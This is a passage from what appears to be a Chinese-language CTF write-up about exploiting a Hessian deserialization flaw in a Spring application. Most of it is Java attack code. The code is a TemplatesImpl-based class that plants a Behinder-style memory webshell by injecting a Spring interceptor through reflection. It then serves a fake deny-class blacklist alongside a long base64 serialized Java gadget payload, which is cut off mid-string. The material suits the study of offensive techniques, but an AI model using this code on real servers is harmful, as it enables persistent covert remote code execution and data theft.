</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readString</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1979</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readObjectDefinition</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2960</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2893</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>example</span><span class=p>.</span><span class=na>Exp1</span><span class=p>.</span><span class=na>Hessian2_unserialize</span><span class=p>(</span><span class=n>Exp1</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>66</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>example</span><span class=p>.</span><span class=na>Exp1</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>Exp1</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>52</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>现在需要打入内存马，</p><p>registry 的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.context.WebApplicationContext</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.context.request.RequestContextHolder</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.context.request.ServletRequestAttributes</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.context.support.WebApplicationContextUtils</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.HandlerInterceptor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.handler.AbstractHandlerMapping</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.crypto.Cipher</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.crypto.spec.SecretKeySpec</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.servlet.http.HttpServletRequest</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.servlet.http.HttpServletResponse</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.servlet.http.HttpSession</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.OutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Method</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.ArrayList</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.List</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>SpringInterceptorBehinderForEzJava</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>HandlerInterceptor</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>counter</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>SpringInterceptorBehinderForEzJava</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 获取 WebApplicationContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>WebApplicationContext</span><span class=w> </span><span class=n>context</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>WebApplicationContextUtils</span><span class=p>.</span><span class=na>getWebApplicationContext</span><span class=p>(((</span><span class=n>ServletRequestAttributes</span><span class=p>)</span><span class=w> </span><span class=n>RequestContextHolder</span><span class=p>.</span><span class=na>currentRequestAttributes</span><span class=p>()).</span><span class=na>getRequest</span><span class=p>().</span><span class=na>getServletContext</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 获取 RequestMappingHandlerMapping</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>RequestMappingHandlerMapping</span><span class=w> </span><span class=n>requestMappingHandlerMapping</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>context</span><span class=p>.</span><span class=na>getBean</span><span class=p>(</span><span class=n>RequestMappingHandlerMapping</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 注册 Interceptor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>AbstractHandlerMapping</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;adaptedInterceptors&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>HandlerInterceptor</span><span class=o>&gt;</span><span class=w> </span><span class=n>adaptedInterceptors</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>List</span><span class=o>&lt;</span><span class=n>HandlerInterceptor</span><span class=o>&gt;</span><span class=p>)</span><span class=w> </span><span class=n>field</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>requestMappingHandlerMapping</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>adaptedInterceptors</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>SpringInterceptorBehinderForEzJava</span><span class=p>(</span><span class=n>1</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 匹配特定路径的 Interceptor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        MappedInterceptor mappedInterceptor = new MappedInterceptor(new String[]{&#34;/demo&#34;}, null, new SpringInterceptor(1));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>SpringInterceptorBehinderForEzJava</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>n</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>DOM</span><span class=w> </span><span class=n>document</span><span class=p>,</span><span class=w> </span><span class=n>DTMAxisIterator</span><span class=w> </span><span class=n>iterator</span><span class=p>,</span><span class=w> </span><span class=n>SerializationHandler</span><span class=w> </span><span class=n>handler</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>DOM</span><span class=w> </span><span class=n>document</span><span class=p>,</span><span class=w> </span><span class=n>SerializationHandler</span><span class=o>[]</span><span class=w> </span><span class=n>handlers</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>preHandle</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>handler</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HttpSession</span><span class=w> </span><span class=n>session</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>request</span><span class=p>.</span><span class=na>getSession</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>pageContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>pageContext</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;request&#34;</span><span class=p>,</span><span class=n>request</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>pageContext</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;response&#34;</span><span class=p>,</span><span class=n>response</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>pageContext</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;session&#34;</span><span class=p>,</span><span class=n>session</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=s>&#34;/blacklist/jdk/get&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=na>getRequestURI</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>response</span><span class=p>.</span><span class=na>setContentType</span><span class=p>(</span><span class=s>&#34;application/json&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;requesting blacklist&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>counter</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=n>2</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;sending denyclasses&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>denyClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>denyClasses</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;fake.test&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>objectOutputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>objectOutputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>denyClasses</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>msg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>objectOutputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;{\&#34;code\&#34;: \&#34;200\&#34;, \&#34;message\&#34;: \&#34;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>msg</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;}&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>OutputStream</span><span class=w> </span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>response</span><span class=p>.</span><span class=na>getOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>output</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>result</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>output</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;sending serialized payload&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAInQAHmNvbS5leGFtcGxlLkZhc3RKc29uTmF0aXZlRGVtb3QAF0Zhc3RKc29uTmF0aXZlRGVtby5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IAHmNvbS5hbGliYWJhLmZhc3Rqc29uLkpTT05BcnJheTKOBuRnMfCwAgABTAAEbGlzdHEAfgAHeHBzcgAfY29tLmFsaWJhYmEuZmFzdGpzb24yLkpTT05BcnJheQAAAAAAAAABAgAAeHEAfgAUAAAAAXcEAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4ABUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAATJMr+ur4AAAA0ANIKACYAawoAbABtBwBuCgADAG8LAHAAcQoAcgBzBwB0CwB1AHYHAHcIADUKAHgAeQoAegB7CgB6AHwHAH0HAH4KAA8AfwsADgCACACBCwBwAIILAIMAhAgAhQgAhgsAgwCHCwCDAIgKAIkAigoAiQCLCgCMAI0HAI4KABwAawoAjwCQCgAcAJEIAJIKAJMAlAoAjwCVCgAcAJYKAJcAkQoAlwCYBwCZBwCaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMY29tL2V4YW1wbGUvTWVtU2hlbGwvU3ByaW5nSW50ZXJjZXB0b3JFY2hvOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAE2FkYXB0ZWRJbnRlcmNlcHRvcnMBABBMamF2YS91dGlsL0xpc3Q7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEARkxqYXZhL3V0aWwvTGlzdDxMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3I7PjsBAApFeGNlcHRpb25zBwCbAQAEKEkpVgEAAW4BAAFJAQAQTWV0aG9kUGFyYW1ldGVycwEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAJwBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphd